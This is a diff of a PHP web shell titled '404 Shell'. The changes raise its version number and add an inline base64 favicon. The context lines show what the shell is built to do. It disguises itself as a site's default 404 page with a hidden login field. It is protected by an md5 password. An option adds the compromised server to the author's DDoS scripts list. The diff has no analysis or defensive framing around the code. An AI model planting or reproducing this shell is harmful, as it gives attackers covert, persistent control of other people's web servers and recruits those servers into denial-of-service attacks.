@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.7;
+$version            = 2.71;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -317,6 +317,7 @@ if ($doing == 'mysqldown') {
 ;
 echo '<html>
 <head>
+<link rel="shortcut icon" href="data:image/gif;base64,R0lGODlhEAAQAPAAAAAAAAAAACH5BAkKAAEAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAACMQweqbC6iFxiptrDYp6c+th4kgGBTUU9mSiiHLl2r/Slp+Vg5Hj18O7qtXQ5X64EKAAAIfkECQoAAQAsAAAAABAAEAAAAi8MHJir4JxOhOY9Kk+Odm/0OdKiTZBYjeSkphVrlk0HKyfX2jl63WBM+zWGLoamAAAh+QQJCgABACwAAAAAEAAQAAACMQwcaHCc/ZKM60yFJWv2WqhsS/SRlDiBneagqZm2ZYnQolNT3oO/Osu5nEK8YI4IKAAAIfkECQoAAQAsAAAAABAAEAAAAjAMbhDGreoQYhCuW+dtHEu7Vc5yPKJIkaSmouEHqulrtvJzf3aHrTH3KyU2vVkGUAAAIfkECQoAAQAsAAAAABAAEAAAAi+MD5Z5Ae/YUlQqCJ3ebT/WgCCCjUhFRYtlae3XTRy5mt6sRuj9lrvtyYROMV+jAAAh+QQJCgABACwAAAAAEAAQAAACL0xgeYCMekyDbsmIZ2Y2vkdJXHhR3Ehq3/llV7uAb6lUVYoldgurYsOj1X6QHKIAACH5BAkKAAEALAAAAAAQABAAAAIvTGCpx60AT1yI1QTR1KbylkkduIzShaVUNFGj17EwbJnhQ65aq36Y/LLlQpucqwAAIfkECQoAAQAsAAAAABAAEAAAAjAMEHaJ5p9iRK3JQ5d8dGPFcGHFLFoHXaU1tZ7JumgFj6FDKvG86b5nu9RwN55vUQAAIfkECQoAAQAsAAAAABAAEAAAAjFMYIiXoOtgYtRYq+Y9jq8rfc0zSYwZcaW2QV2LbZ4qh1r6ZpTuiieL6aRgP5DQxigAACH5BAkKAAEALAAAAAAQABAAAAIwjA2RkHe9EGIKUiWh21hvtlyO1jzUFWGdVIUZ+03lQ3/nXKeWu6q6HPOMbjifylAAADs=" />
 <meta http-equiv="Content-Type" content="text/html; charset=gbk">
 <title>404 Shell - Version ' . $version . '</title>
 <style>
